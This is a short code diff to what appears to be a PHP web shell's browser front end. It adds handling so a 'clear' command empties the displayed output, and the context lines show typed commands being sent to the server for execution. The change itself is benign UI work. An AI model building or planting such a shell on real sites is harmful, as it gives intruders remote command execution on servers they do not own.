@@ -236,6 +236,9 @@ if (isset($_GET["feature"])) {
                 _insertCommand(command);
                 if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                     featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
+                } else if (/^\s*clear\s*$/.test(command)) {
+                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
+                    eShellContent.innerHTML = '';
                 } else {
                     makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
